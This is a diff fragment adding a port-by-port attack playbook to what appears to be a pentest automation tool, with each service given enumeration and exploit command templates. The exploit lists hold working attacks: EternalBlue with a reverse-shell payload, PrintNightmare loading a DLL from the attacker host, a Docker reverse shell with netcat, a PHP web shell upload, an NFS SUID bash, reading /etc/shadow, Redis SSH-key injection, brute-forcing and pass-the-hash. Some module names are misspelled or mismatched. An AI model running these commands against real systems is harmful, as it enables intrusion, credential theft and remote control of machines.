+      'smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {IP} -p {PORT} 2>&1 | tee {OUTDIR}/smtp_{PORT}_users.txt',
+      '# Banner grab',
+      'nc -nv {IP} {PORT} <<EOF\nEHLO test\nVRFY root\nEXPN postmaster\nQUIT\nEOF',
+      'swaks --to test@target.local --server {IP}:{PORT}',
+    ],
+    exploit:[
+      '# Open relay test',
+      'nmap --script smtp-open-relay -p {PORT} {IP}',
+      'swaks --to attacker@evil.com --from admin@{IP} --server {IP}:{PORT}',
+      '# SMTP brute',
+      'hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -s {PORT} {IP} smtp -t 8',
+    ],
+    msf:['auxiliary/scanner/smtp/smtp_relay','auxiliary/scanner/smtp/smtp_enum']
+  },
+
+  53: { name:'DNS', color:'#06b6d4', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=dns-zone-transfer,dns-recursion,dns-brute,dns-srv-enum,dns-nsid,dns-nsec-enum -p {PORT} {IP} -oN {OUTDIR}/dns_{PORT}_nmap.txt',
+      '# Zone transfer attempts',
+      'dig axfr @{IP} . 2>&1 | tee {OUTDIR}/dns_{PORT}_axfr.txt',
+      'dig axfr @{IP} local 2>&1 >> {OUTDIR}/dns_{PORT}_axfr.txt',
+      '# Reverse lookup + basic enum',
+      'dnsrecon -t axfr -d {IP} 2>&1 | tee {OUTDIR}/dns_{PORT}_dnsrecon.txt',
+      'dnsenum --dnsserver {IP} --noreverse {IP} 2>&1 | tee {OUTDIR}/dns_{PORT}_dnsenum.txt',
+      '# PTR records',
+      'dig -x {IP} @{IP} 2>&1',
+    ],
+    exploit:[
+      '# Zone transfer exploitation',
+      'fierce --dns-servers {IP} --domain local 2>&1 | tee {OUTDIR}/dns_{PORT}_fierce.txt',
+      '# DNS cache poisoning check',
+      'nmap --script dns-cache-snoop -p {PORT} {IP}',
+      '# Amplification check',
+      'dig ANY . @{IP}',
+    ],
+    msf:['auxiliary/gather/dns_brutefore','auxiliary/gather/dns_cache_scraper']
+  },
+
+  79: { name:'Finger', color:'#8250df', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=finger -p {PORT} {IP}',
+      'finger @{IP}',
+      'finger root@{IP}',
+    ],
+    exploit:[
+      'finger "|/bin/sh -i" @{IP}',
+      'msfconsole -q -x "use auxiliary/scanner/finger/finger_users; set RHOSTS {IP}; run"',
+    ],
+    msf:['auxiliary/scanner/finger/finger_users']
+  },
+
+  80: { name:'HTTP', color:'#0a7ea4', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=http-title,http-headers,http-methods,http-auth-finder,http-cookie-flags,http-robots.txt,http-server-header,http-waf-detect -p {PORT} {IP} -oN {OUTDIR}/http_{PORT}_nmap.txt',
+      '# Web server / tech detection',
+      'whatweb http://{IP}:{PORT} 2>&1 | tee {OUTDIR}/http_{PORT}_whatweb.txt',
+      '# Nikto scan',
+      'nikto -h http://{IP}:{PORT} -o {OUTDIR}/http_{PORT}_nikto.txt 2>&1',
+      '# Directory brute-force',
+      'gobuster dir -u http://{IP}:{PORT} -w {WORDLIST} -o {OUTDIR}/http_{PORT}_gobuster.txt -x php,html,txt,asp,aspx -t 40 2>&1',
+      '# Curl basic info',
+      'curl -sI http://{IP}:{PORT} 2>&1 | tee {OUTDIR}/http_{PORT}_headers.txt',
+      'curl -sk http://{IP}:{PORT}/robots.txt 2>&1',
+      'curl -sk http://{IP}:{PORT}/crossdomain.xml 2>&1',
+    ],
+    exploit:[
+      '# SQLi test with sqlmap',
+      'sqlmap -u "http://{IP}:{PORT}/?id=1" --batch --dbs 2>&1 | tee {OUTDIR}/http_{PORT}_sqlmap.txt',
+      '# XSS / injection quick tests',
+      'curl -sk "http://{IP}:{PORT}/?q=<script>alert(1)<\/script>" | grep -i "script"',
+      '# Shellshock (CVE-2014-6271)',
+      'curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c \'id\'" http://{IP}:{PORT}/cgi-bin/test.cgi',
+      '# Default creds on common apps',
+      'hydra -l admin -P /usr/share/wordlists/rockyou.txt {IP} -s {PORT} http-get / -t 4',
+    ],
+    msf:['auxiliary/scanner/http/http_version','exploit/multi/http/apache_mod_cgi_bash_env_exec']
+  },
+
+  110: { name:'POP3', color:'#f59e0b', risk:'LOW',
+    enum:[
+      'nmap -sV --script=pop3-capabilities,pop3-ntlm-info -p {PORT} {IP} -oN {OUTDIR}/pop3_{PORT}_nmap.txt',
+      'nc -nv {IP} {PORT} <<EOF\nUSER test\nPASS test\nQUIT\nEOF',
+    ],
+    exploit:[
+      'hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -s {PORT} {IP} pop3 -t 8',
+      'msfconsole -q -x "use auxiliary/scanner/pop3/pop3_login; set RHOSTS {IP}; set RPORT {PORT}; run"',
+    ],
+    msf:['auxiliary/scanner/pop3/pop3_login']
+  },
+
+  111: { name:'RPC', color:'#8250df', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=rpcinfo,nfs-ls,nfs-showmount,nfs-statfs -p {PORT} {IP} -oN {OUTDIR}/rpc_{PORT}_nmap.txt',
+      'rpcinfo -p {IP} 2>&1 | tee {OUTDIR}/rpc_{PORT}_rpcinfo.txt',
+      'showmount -e {IP} 2>&1 | tee {OUTDIR}/rpc_{PORT}_showmount.txt',
+    ],
+    exploit:[
+      '# Mount exposed NFS shares',
+      'mkdir -p /tmp/nfs_mount && mount -t nfs {IP}:/ /tmp/nfs_mount -o nolock 2>&1',
+      'ls -la /tmp/nfs_mount/',
+    ],
+    msf:['auxiliary/scanner/nfs/nfsmount']
+  },
+
+  135: { name:'MSRPC', color:'#666688', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=msrpc-enum -p {PORT} {IP} -oN {OUTDIR}/msrpc_{PORT}_nmap.txt',
+      'impacket-rpcdump @{IP} 2>&1 | tee {OUTDIR}/msrpc_{PORT}_rpcdump.txt',
+      'impacket-rpcmap ncacn_ip_tcp:{IP}[{PORT}] 2>&1 | tee {OUTDIR}/msrpc_{PORT}_rpcmap.txt',
+    ],
+    exploit:[
+      '# Check for MS03-026 / MS03-039',
+      'msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; set RHOSTS {IP}; run"',
+      'msfconsole -q -x "use exploit/windows/dcerpc/ms05_017_msmq; set RHOSTS {IP}; run"',
+    ],
+    msf:['exploit/windows/dcerpc/ms03_026_dcom','auxiliary/scanner/dcerpc/endpoint_mapper']
+  },
+
+  139: { name:'NetBIOS-SMB', color:'#cf222e', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=smb-os-discovery,smb-security-mode,smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 -p {PORT} {IP} -oN {OUTDIR}/smb_{PORT}_nmap.txt',
+      'enum4linux -a {IP} 2>&1 | tee {OUTDIR}/smb_{PORT}_enum4linux.txt',
+      'smbclient -L //{IP} -N 2>&1 | tee {OUTDIR}/smb_{PORT}_shares.txt',
+      'smbmap -H {IP} -P {PORT} 2>&1 | tee {OUTDIR}/smb_{PORT}_smbmap.txt',
+      'crackmapexec smb {IP} -u "" -p "" --shares 2>&1 | tee {OUTDIR}/smb_{PORT}_cme.txt',
+    ],
+    exploit:[
+      '# EternalBlue MS17-010',
+      'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {IP}; set LHOST {LHOST}; run"',
+      '# PsExec-style execution',
+      'impacket-psexec {IP}/Administrator:Password123@{IP}',
+      '# crackmapexec spray',
+      'crackmapexec smb {IP} -u administrator -p /usr/share/wordlists/rockyou.txt --no-bruteforce',
+      '# SMBClient null session',
+      'smbclient //{IP}/C$ -N',
+    ],
+    msf:['exploit/windows/smb/ms17_010_eternalblue','exploit/windows/smb/psexec']
+  },
+
+  143: { name:'IMAP', color:'#f59e0b', risk:'LOW',
+    enum:[
+      'nmap -sV --script=imap-capabilities,imap-ntlm-info -p {PORT} {IP}',
+      'nc -nv {IP} {PORT} <<EOF\na1 CAPABILITY\na2 LOGIN test test\na3 LIST "" "*"\na4 LOGOUT\nEOF',
+    ],
+    exploit:[
+      'hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -s {PORT} {IP} imap',
+    ],
+    msf:['auxiliary/scanner/imap/imap_login']
+  },
+
+  161: { name:'SNMP', color:'#8250df', risk:'HIGH',
+    enum:[
+      'nmap -sU --script=snmp-brute,snmp-info,snmp-interfaces,snmp-sysdescr,snmp-processes -p {PORT} {IP} -oN {OUTDIR}/snmp_{PORT}_nmap.txt',
+      'onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {IP} 2>&1 | tee {OUTDIR}/snmp_{PORT}_community.txt',
+      'snmpwalk -v2c -c public {IP}:{PORT} . 2>&1 | tee {OUTDIR}/snmp_{PORT}_walk_public.txt',
+      'snmpwalk -v2c -c private {IP}:{PORT} . 2>&1 | tee {OUTDIR}/snmp_{PORT}_walk_private.txt',
+      'snmp-check {IP} -p {PORT} -c public 2>&1 | tee {OUTDIR}/snmp_{PORT}_check.txt',
+    ],
+    exploit:[
+      '# Write community string → RCE',
+      'nmap --script snmp-brute -p {PORT}/udp {IP}',
+      '# If write access: modify system info',
+      'snmpset -v2c -c private {IP} sysName.0 s "hacked"',
+    ],
+    msf:['auxiliary/scanner/snmp/snmp_login','auxiliary/scanner/snmp/snmp_enum']
+  },
+
+  389: { name:'LDAP', color:'#0a7ea4', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=ldap-rootdse,ldap-search,ldap-brute -p {PORT} {IP} -oN {OUTDIR}/ldap_{PORT}_nmap.txt',
+      '# Null bind + base enum',
+      'ldapsearch -x -H ldap://{IP}:{PORT} -b "" -s base 2>&1 | tee {OUTDIR}/ldap_{PORT}_base.txt',
+      'ldapsearch -x -H ldap://{IP}:{PORT} -b "DC=domain,DC=local" "(objectClass=*)" 2>&1 | tee {OUTDIR}/ldap_{PORT}_all.txt',
+      '# Domain users',
+      'ldapsearch -x -H ldap://{IP}:{PORT} -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName 2>&1 | tee {OUTDIR}/ldap_{PORT}_users.txt',
+    ],
+    exploit:[
+      '# LDAP injection',
+      'ldapsearch -x -H ldap://{IP}:{PORT} -b "DC=domain,DC=local" "(&(objectClass=user)(cn=*))"',
+      '# Anonymous bind exploit',
+      'ldapsearch -x -H ldap://{IP}:{PORT} -b "" -s sub "(objectClass=*)" * + 2>&1',
+      'bloodhound-python -d domain.local -u anonymous -p "" -ns {IP} -c all 2>&1 | tee {OUTDIR}/ldap_{PORT}_bloodhound.txt',
+    ],
+    msf:['auxiliary/gather/ldap_query']
+  },
+
+  443: { name:'HTTPS', color:'#0a7ea4', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=ssl-cert,ssl-enum-ciphers,http-title,http-headers,http-methods,http-waf-detect -p {PORT} {IP} -oN {OUTDIR}/https_{PORT}_nmap.txt',
+      'sslscan {IP}:{PORT} 2>&1 | tee {OUTDIR}/https_{PORT}_sslscan.txt',
+      'testssl.sh {IP}:{PORT} 2>&1 | tee {OUTDIR}/https_{PORT}_testssl.txt',
+      'whatweb https://{IP}:{PORT} 2>&1 | tee {OUTDIR}/https_{PORT}_whatweb.txt',
+      'nikto -h https://{IP}:{PORT} -ssl -o {OUTDIR}/https_{PORT}_nikto.txt 2>&1',
+      'gobuster dir -u https://{IP}:{PORT} -w {WORDLIST} -k -o {OUTDIR}/https_{PORT}_gobuster.txt -x php,html,txt,asp,aspx -t 40 2>&1',
+    ],
+    exploit:[
+      '# Heartbleed (CVE-2014-0160)',
+      'nmap --script ssl-heartbleed -p {PORT} {IP}',
+      '# POODLE / DROWN check',
+      'nmap --script ssl-poodle -p {PORT} {IP}',
+      '# SQLi / XSS via HTTPS',
+      'sqlmap -u "https://{IP}:{PORT}/?id=1" --batch --dbs --level=3 2>&1 | tee {OUTDIR}/https_{PORT}_sqlmap.txt',
+    ],
+    msf:['auxiliary/scanner/ssl/openssl_heartbleed','exploit/multi/http/apache_mod_cgi_bash_env_exec']
+  },
+
+  445: { name:'SMB', color:'#cf222e', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=smb-os-discovery,smb-security-mode,smb-enum-shares,smb-enum-users,smb-vuln-ms17-010,smb-vuln-ms10-054,smb-vuln-cve-2020-0796 -p {PORT} {IP} -oN {OUTDIR}/smb_{PORT}_nmap.txt',
+      'enum4linux -a {IP} 2>&1 | tee {OUTDIR}/smb_{PORT}_enum4linux.txt',
+      'smbmap -H {IP} 2>&1 | tee {OUTDIR}/smb_{PORT}_smbmap.txt',
+      'crackmapexec smb {IP} -u "" -p "" --shares --users --groups 2>&1 | tee {OUTDIR}/smb_{PORT}_cme.txt',
+      'impacket-smbclient {IP} 2>&1 | head -30',
+      '# Check SAM / LSA dumps possible',
+      'crackmapexec smb {IP} --shares -u administrator -p "" 2>&1',
+    ],
+    exploit:[
+      '# EternalBlue',
+      'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {IP}; set LHOST {LHOST}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run"',
+      '# PrintNightmare (CVE-2021-1675)',
+      'python3 /opt/CVE-2021-1675/CVE-2021-1675.py domain/user:pass@{IP} \'\\\\{LHOST}\\share\\rev.dll\'',
+      '# PsExec RCE',
+      'impacket-psexec Administrator:Password@{IP} cmd.exe',
+      '# SMBGhost (CVE-2020-0796)',
+      'msfconsole -q -x "use exploit/windows/smb/cve_2020_0796_smbghost; set RHOSTS {IP}; run"',
+    ],
+    msf:['exploit/windows/smb/ms17_010_eternalblue','exploit/windows/smb/psexec','exploit/windows/smb/cve_2020_0796_smbghost']
+  },
+
+  808: { name:'HTTP-CCProxy', color:'#0a7ea4', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=http-title,http-headers -p {PORT} {IP}',
+      'curl -sI http://{IP}:{PORT} 2>&1 | tee {OUTDIR}/http_{PORT}_headers.txt',
+      'curl -sk http://{IP}:{PORT}/ 2>&1 | head -50',
+      'nikto -h http://{IP}:{PORT} 2>&1 | tee {OUTDIR}/http_{PORT}_nikto.txt',
+    ],
+    exploit:[
+      '# Test open proxy',
+      'curl -x http://{IP}:{PORT} http://ifconfig.me 2>&1',
+      '# Directory brute',
+      'gobuster dir -u http://{IP}:{PORT} -w {WORDLIST} -t 30 2>&1 | tee {OUTDIR}/http_{PORT}_gobuster.txt',
+    ],
+    msf:['auxiliary/scanner/http/http_version']
+  },
+
+  873: { name:'Rsync', color:'#f59e0b', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=rsync-list-modules -p {PORT} {IP} -oN {OUTDIR}/rsync_{PORT}_nmap.txt',
+      'rsync --list-only rsync://{IP}:{PORT}/ 2>&1 | tee {OUTDIR}/rsync_{PORT}_modules.txt',
+      '# List each module',
+      'rsync --list-only rsync://{IP}:{PORT}/backup 2>&1',
+    ],
+    exploit:[
+      '# Download files from exposed module',
+      'rsync -av rsync://{IP}:{PORT}/backup /tmp/rsync_loot/ 2>&1 | tee {OUTDIR}/rsync_{PORT}_loot.txt',
+      '# Upload web shell if write access to webroot',
+      'echo "<?php system(\\$_GET[\'cmd\']); ?>" > /tmp/shell.php && rsync /tmp/shell.php rsync://{IP}:{PORT}/www/shell.php',
+    ],
+    msf:[]
+  },
+
+  1433: { name:'MSSQL', color:'#cf222e', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-tables,ms-sql-xp-cmdshell -p {PORT} {IP} -oN {OUTDIR}/mssql_{PORT}_nmap.txt',
+      'crackmapexec mssql {IP} -p {PORT} -u sa -p "" 2>&1 | tee {OUTDIR}/mssql_{PORT}_cme.txt',
+      'impacket-mssqlclient {IP}/{user}:{pass}@{IP} -p {PORT} -windows-auth 2>&1 | tee {OUTDIR}/mssql_{PORT}_connect.txt',
+      '# Check linked servers',
+      'nmap --script ms-sql-info --script-args mssql.username=sa,mssql.password="" -p {PORT} {IP}',
+    ],
+    exploit:[
+      '# Enable xp_cmdshell',
+      'impacket-mssqlclient sa:@{IP} -p {PORT} -windows-auth -query "EXEC sp_configure \'show advanced options\',1; RECONFIGURE; EXEC sp_configure \'xp_cmdshell\',1; RECONFIGURE; EXEC xp_cmdshell \'whoami\'"',
+      '# Brute-force SA',
+      'hydra -l sa -P /usr/share/wordlists/rockyou.txt {IP} -s {PORT} mssql -t 4 2>&1 | tee {OUTDIR}/mssql_{PORT}_hydra.txt',
+      '# Metasploit xp_cmdshell',
+      'msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOSTS {IP}; set RPORT {PORT}; set USERNAME sa; set PASSWORD \\"\\"; run"',
+    ],
+    msf:['exploit/windows/mssql/mssql_payload','auxiliary/scanner/mssql/mssql_login','auxiliary/admin/mssql/mssql_exec']
+  },
+
+  1521: { name:'Oracle', color:'#f59e0b', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=oracle-tns-version,oracle-sid-brute,oracle-brute -p {PORT} {IP} -oN {OUTDIR}/oracle_{PORT}_nmap.txt',
+      'tnscmd10g version -h {IP} -p {PORT} 2>&1 | tee {OUTDIR}/oracle_{PORT}_tnscmd.txt',
+      'odat all -s {IP} -p {PORT} --output-file {OUTDIR}/oracle_{PORT}_odat.txt 2>&1',
+      '# SID brute-force',
+      'odat sidguesser -s {IP} -p {PORT} 2>&1 | tee {OUTDIR}/oracle_{PORT}_sid.txt',
+    ],
+    exploit:[
+      '# Login with discovered SIDs',
+      'odat passwordguesser -s {IP} -p {PORT} -d ORCL --accounts-file /usr/share/seclists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt 2>&1 | tee {OUTDIR}/oracle_{PORT}_creds.txt',
+      '# Java exec after login',
+      'odat java -s {IP} -p {PORT} -d ORCL -U scott -P tiger --sysdba --exec "cmd.exe /c whoami" 2>&1',
+      'msfconsole -q -x "use exploit/windows/oracle/tns_auth_sesskey; set RHOSTS {IP}; set RPORT {PORT}; run"',
+    ],
+    msf:['exploit/windows/oracle/tns_auth_sesskey','auxiliary/scanner/oracle/oracle_login']
+  },
+
+  1556: { name:'Veritas-PBX', color:'#666688', risk:'LOW',
+    enum:[
+      'nmap -sV --script=banner -p {PORT} {IP}',
+      'nc -nv {IP} {PORT} </dev/null 2>&1 | head -5',
+    ],
+    exploit:[
+      'msfconsole -q -x "use auxiliary/scanner/misc/veritas_pbx; set RHOSTS {IP}; set RPORT {PORT}; run"',
+    ],
+    msf:['auxiliary/scanner/misc/veritas_pbx']
+  },
+
+  1801: { name:'MSMQ', color:'#666688', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=msrpc-enum -p {PORT} {IP}',
+      'nmap -sV -p {PORT} {IP}',
+    ],
+    exploit:[
+      '# MS07-065 MSMQ overflow',
+      'msfconsole -q -x "use exploit/windows/wins/ms04_045_wins; set RHOSTS {IP}; run"',
+    ],
+    msf:[]
+  },
+
+  2049: { name:'NFS', color:'#f59e0b', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs -p {PORT} {IP} -oN {OUTDIR}/nfs_{PORT}_nmap.txt',
+      'showmount -e {IP} 2>&1 | tee {OUTDIR}/nfs_{PORT}_showmount.txt',
+      'rpcinfo -p {IP} 2>&1 | grep nfs',
+    ],
+    exploit:[
+      '# Mount NFS share',
+      'mkdir -p /tmp/nfs && mount -t nfs -o nolock {IP}:/ /tmp/nfs 2>&1 && ls -la /tmp/nfs/',
+      '# no_root_squash exploit',
+      'cp /bin/bash /tmp/nfs/ && chmod u+s /tmp/nfs/bash',
+      '# Read sensitive files',
+      'cat /tmp/nfs/etc/passwd /tmp/nfs/etc/shadow 2>&1',
+    ],
+    msf:['auxiliary/scanner/nfs/nfsmount']
+  },
+
+  2375: { name:'Docker-API', color:'#cf222e', risk:'CRITICAL',
+    enum:[
+      'curl -s http://{IP}:{PORT}/version 2>&1 | tee {OUTDIR}/docker_{PORT}_version.txt',
+      'curl -s http://{IP}:{PORT}/containers/json 2>&1 | tee {OUTDIR}/docker_{PORT}_containers.txt',
+      'curl -s http://{IP}:{PORT}/images/json 2>&1 | tee {OUTDIR}/docker_{PORT}_images.txt',
+      'docker -H {IP}:{PORT} ps 2>&1 | tee {OUTDIR}/docker_{PORT}_ps.txt',
+      'docker -H {IP}:{PORT} info 2>&1 | tee {OUTDIR}/docker_{PORT}_info.txt',
+    ],
+    exploit:[
+      '# Container escape via privileged container',
+      'docker -H {IP}:{PORT} run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh',
+      '# Spawn reverse shell',
+      'docker -H {IP}:{PORT} run --rm -it alpine sh -c "apk add nc && nc {LHOST} 4444 -e /bin/sh"',
+    ],
+    msf:[]
+  },
+
+  3141: { name:'MSSQL-alt', color:'#cf222e', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=ms-sql-info,ms-sql-empty-password -p {PORT} {IP} -oN {OUTDIR}/mssql_{PORT}_nmap.txt',
+      'impacket-mssqlclient {IP} -p {PORT} 2>&1 | tee {OUTDIR}/mssql_{PORT}_connect.txt',
+      'crackmapexec mssql {IP} -p {PORT} -u sa -p "" 2>&1',
+    ],
+    exploit:[
+      '# Same as port 1433',
+      'impacket-mssqlclient sa:@{IP} -p {PORT} -windows-auth -query "EXEC xp_cmdshell \'whoami\'"',
+      'msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOSTS {IP}; set RPORT {PORT}; run"',
+    ],
+    msf:['exploit/windows/mssql/mssql_payload']
+  },
+
+  3306: { name:'MySQL', color:'#0a7ea4', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=mysql-info,mysql-enum,mysql-empty-password,mysql-databases,mysql-users -p {PORT} {IP} -oN {OUTDIR}/mysql_{PORT}_nmap.txt',
+      'mysql -h {IP} -P {PORT} -u root --password="" -e "select version(); show databases;" 2>&1 | tee {OUTDIR}/mysql_{PORT}_root.txt',
+      'mysqldump -h {IP} -P {PORT} -u root --password="" --all-databases 2>&1 | tee {OUTDIR}/mysql_{PORT}_dump.txt',
+    ],
+    exploit:[
+      '# UDF RCE (if write to plugin dir)',
+      'mysql -h {IP} -P {PORT} -u root -p -e "create function sys_exec returns integer soname \'udf_sys_exec.so\'; select sys_exec(\'id > /tmp/pwn\');"',
+      '# Brute force',
+      'hydra -l root -P /usr/share/wordlists/rockyou.txt {IP} -s {PORT} mysql -t 4 2>&1 | tee {OUTDIR}/mysql_{PORT}_hydra.txt',
+      'msfconsole -q -x "use exploit/linux/mysql/mysql_udf_payload; set RHOSTS {IP}; set RPORT {PORT}; run"',
+    ],
+    msf:['exploit/linux/mysql/mysql_udf_payload','auxiliary/scanner/mysql/mysql_login']
+  },
+
+  3389: { name:'RDP', color:'#cf222e', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info -p {PORT} {IP} -oN {OUTDIR}/rdp_{PORT}_nmap.txt',
+      'rdp-sec-check {IP}:{PORT} 2>&1 | tee {OUTDIR}/rdp_{PORT}_seccheck.txt',
+      'ncrack -vv --user administrator -P /usr/share/wordlists/rockyou.txt rdp://{IP}:{PORT} --connection-limit 1 2>&1 | head -50',
+    ],
+    exploit:[
+      '# BlueKeep (CVE-2019-0708)',
+      'msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {IP}; set RPORT {PORT}; run"',
+      '# DejaBlue (CVE-2019-1181/1182)',
+      'msfconsole -q -x "use exploit/windows/rdp/cve_2019_1181_dejalue; set RHOSTS {IP}; set RPORT {PORT}; run"',
+      '# Credential brute',
+      'hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{IP}:{PORT} -t 4 -vV 2>&1 | tee {OUTDIR}/rdp_{PORT}_hydra.txt',
+    ],
+    msf:['exploit/windows/rdp/cve_2019_0708_bluekeep_rce']
+  },
+
+  5357: { name:'WSDAPI', color:'#666688', risk:'LOW',
+    enum:[
+      'nmap -sV --script=http-title,http-headers -p {PORT} {IP}',
+      'curl -sI http://{IP}:{PORT}/ 2>&1 | head -20',
+      'curl -sk http://{IP}:{PORT}/ 2>&1 | head -40',
+    ],
+    exploit:[
+      '# CVE-2009-0087 WSDAPI overflow',
+      'msfconsole -q -x "use exploit/windows/http/ms09_072_style_object; set RHOSTS {IP}; run"',
+    ],
+    msf:[]
+  },
+
+  5432: { name:'PostgreSQL', color:'#0a7ea4', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=pgsql-brute -p {PORT} {IP} -oN {OUTDIR}/psql_{PORT}_nmap.txt',
+      'psql -h {IP} -p {PORT} -U postgres -c "\\l" 2>&1 | tee {OUTDIR}/psql_{PORT}_dbs.txt',
+      'psql -h {IP} -p {PORT} -U postgres -c "SELECT version();" 2>&1',
+      'psql -h {IP} -p {PORT} -U postgres -c "SELECT usename,passwd FROM pg_shadow;" 2>&1 | tee {OUTDIR}/psql_{PORT}_hashes.txt',
+    ],
+    exploit:[
+      '# COPY TO/FROM PROGRAM (RCE)',
+      'psql -h {IP} -p {PORT} -U postgres -c "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \'id\'; SELECT * FROM cmd_exec;"',
+      '# Metasploit',
+      'msfconsole -q -x "use exploit/linux/postgres/postgres_payload; set RHOSTS {IP}; set RPORT {PORT}; run"',
+      '# Brute force',
+      'hydra -l postgres -P /usr/share/wordlists/rockyou.txt {IP} -s {PORT} postgres -t 4 2>&1 | tee {OUTDIR}/psql_{PORT}_hydra.txt',
+    ],
+    msf:['exploit/linux/postgres/postgres_payload','auxiliary/scanner/postgres/postgres_login']
+  },
+
+  5900: { name:'VNC', color:'#8250df', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=vnc-info,vnc-brute -p {PORT} {IP} -oN {OUTDIR}/vnc_{PORT}_nmap.txt',
+      'vncviewer {IP}:{PORT} 2>&1 | head -5',
+    ],
+    exploit:[
+      '# VNC brute force',
+      'hydra -P /usr/share/wordlists/rockyou.txt vnc://{IP}:{PORT} -t 4 -vV 2>&1 | tee {OUTDIR}/vnc_{PORT}_hydra.txt',
+      'msfconsole -q -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS {IP}; set RPORT {PORT}; run"',
+      '# No-auth check',
+      'nmap --script vnc-brute --script-args brute.firstonly=true -p {PORT} {IP}',
+    ],
+    msf:['auxiliary/scanner/vnc/vnc_login']
+  },
+
+  5985: { name:'WinRM', color:'#0a7ea4', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=http-title,http-auth-finder -p {PORT} {IP} -oN {OUTDIR}/winrm_{PORT}_nmap.txt',
+      'crackmapexec winrm {IP} -p {PORT} -u administrator -p "" 2>&1 | tee {OUTDIR}/winrm_{PORT}_cme.txt',
+      'curl -sk http://{IP}:{PORT}/wsman -H "Content-Type: application/soap+xml;charset=UTF-8" 2>&1 | head -20',
+    ],
+    exploit:[
+      '# evil-winrm shell (update creds)',
+      'evil-winrm -i {IP} -p {PORT} -u Administrator -p "Password123"',
+      '# Pass the hash',
+      'evil-winrm -i {IP} -p {PORT} -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c',
+      '# crackmapexec winrm spray',
+      'crackmapexec winrm {IP} -p {PORT} -u /tmp/users.txt -p /usr/share/wordlists/rockyou.txt --no-bruteforce 2>&1 | tee {OUTDIR}/winrm_{PORT}_spray.txt',
+    ],
+    msf:['auxiliary/scanner/winrm/winrm_login','exploit/windows/winrm/winrm_script_exec']
+  },
+
+  5986: { name:'WinRM-TLS', color:'#0a7ea4', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=ssl-cert,http-title -p {PORT} {IP}',
+      'crackmapexec winrm {IP} -p {PORT} -u administrator -p "" --ssl 2>&1 | tee {OUTDIR}/winrm_{PORT}_cme.txt',
+    ],
+    exploit:[
+      'evil-winrm -i {IP} -p {PORT} -u Administrator -p "Password123" -S',
+      'evil-winrm -i {IP} -p {PORT} -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -S',
+    ],
+    msf:['auxiliary/scanner/winrm/winrm_login']
+  },
+
+  6379: { name:'Redis', color:'#cf222e', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=redis-info -p {PORT} {IP} -oN {OUTDIR}/redis_{PORT}_nmap.txt',
+      'redis-cli -h {IP} -p {PORT} ping 2>&1 | tee {OUTDIR}/redis_{PORT}_ping.txt',
+      'redis-cli -h {IP} -p {PORT} info 2>&1 | tee {OUTDIR}/redis_{PORT}_info.txt',
+      'redis-cli -h {IP} -p {PORT} config get "*" 2>&1 | tee {OUTDIR}/redis_{PORT}_config.txt',
+      'redis-cli -h {IP} -p {PORT} keys "*" 2>&1 | tee {OUTDIR}/redis_{PORT}_keys.txt',
+    ],
+    exploit:[
+      '# SSH key injection (if Redis writes to /root/.ssh/)',
+      'ssh-keygen -t rsa -f /tmp/redis_key -N "" 2>&1',
+      'redis-cli -h {IP} -p {PORT} config set dir /root/.ssh/',
+      'redis-cli -h {IP} -p {PORT} config set dbfilename authorized_keys',
+      '(echo -e "\\n\\n"; cat /tmp/redis_key.pub; echo -e "\\n\\n") | redis-cli -h {IP} -p {PORT} -x set payload',
+      'redis-cli -h {IP} -p {PORT} save',
+      'ssh -i /tmp/redis_key root@{IP}',
+      '# Redis RCE via cron job',
+      'redis-cli -h {IP} -p {PORT} config set dir /var/spool/cron/',
